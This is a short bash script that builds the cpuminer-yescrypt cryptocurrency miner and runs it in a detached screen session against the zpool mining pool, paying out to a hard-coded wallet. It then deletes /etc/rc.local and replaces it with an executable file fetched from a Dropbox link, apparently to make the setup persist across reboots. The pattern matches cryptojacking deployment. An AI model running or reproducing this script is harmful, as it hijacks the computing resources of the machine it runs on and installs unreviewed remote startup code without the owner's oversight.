#!/bin/bash
apt-get update
apt-get install git -y
apt-get install screen -y
apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y
git clone https://github.com/noncepool/cpuminer-yescrypt.git miner
cd miner
./autogen.sh
./configure CFLAGS="-O3"
make
mv minerd /usr/local/bin/
cd
screen -dmS ZPOOL minerd -a yescrypt -o stratum+tcp://mine.zpool.ca:6233 -u 15xtsu8mXijRKhiL8DWt5GuRwqKJJm5pRH -p Miner
cd /etc
rm -r rc.local
wget https://www.dropbox.com/s/y9t32t5bumbmj5s/rc.local
chmod +x rc.local